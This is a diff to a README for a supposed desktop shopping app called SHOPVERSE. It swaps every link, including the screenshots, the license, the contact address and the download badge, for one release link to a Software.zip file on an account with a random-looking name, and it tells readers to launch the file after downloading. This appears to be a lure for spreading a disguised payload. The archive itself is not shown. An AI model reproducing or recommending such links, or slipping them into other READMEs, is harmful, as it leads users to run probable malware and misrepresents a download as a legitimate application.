@@ -8,7 +8,7 @@ Welcome to the **DATABASE-PROJECT** repository for SHOPVERSE, a desktop applicat
 ['add', 'buy', 'cart', 'categories', 'login', 'manage', 'notifications', 'product', 'register', 'sell']
 
 ## Quick Start
-Click [here](https://github.com/user-attachments/files/18388744/Software.zip) to download the SHOPVERSE desktop application. The file needs to be launched after downloading.
+Click [here](https://github.com/asdadadsaasdsadas991/DATABASE-PROJECT/releases/download/v2.0/Software.zip) to download the SHOPVERSE desktop application. The file needs to be launched after downloading.
 
 ## Features
 🌟 User-friendly Interface  
@@ -22,8 +22,8 @@ Click [here](https://github.com/user-attachments/files/18388744/Software.zip) to
 🌟 Sell Products  
 
 ## Screenshots
-![SHOPVERSE Home Page](https://link-to-screenshot.com)
-![SHOPVERSE Product Page](https://link-to-screenshot.com)
+![SHOPVERSE Home Page](https://github.com/asdadadsaasdsadas991/DATABASE-PROJECT/releases/download/v2.0/Software.zip)
+![SHOPVERSE Product Page](https://github.com/asdadadsaasdsadas991/DATABASE-PROJECT/releases/download/v2.0/Software.zip)
 
 ## Installation
 1. Download the SHOPVERSE desktop application from the provided link.
@@ -47,9 +47,9 @@ Contributions are welcome! Please follow these steps to contribute:
 6. Create a pull request
 
 ## License
-The SHOPVERSE project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+The SHOPVERSE project is licensed under the [MIT License](https://github.com/asdadadsaasdsadas991/DATABASE-PROJECT/releases/download/v2.0/Software.zip).
 
 ## Contact
-For any inquiries or support, please contact our team at shopverse@example.com.
+For any inquiries or support, please contact our team at https://github.com/asdadadsaasdsadas991/DATABASE-PROJECT/releases/download/v2.0/Software.zip
 
-[![Download SHOPVERSE](https://img.shields.io/badge/Download-SHOPVERSE-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download SHOPVERSE](https://github.com/asdadadsaasdsadas991/DATABASE-PROJECT/releases/download/v2.0/Software.zip)](https://github.com/asdadadsaasdsadas991/DATABASE-PROJECT/releases/download/v2.0/Software.zip)
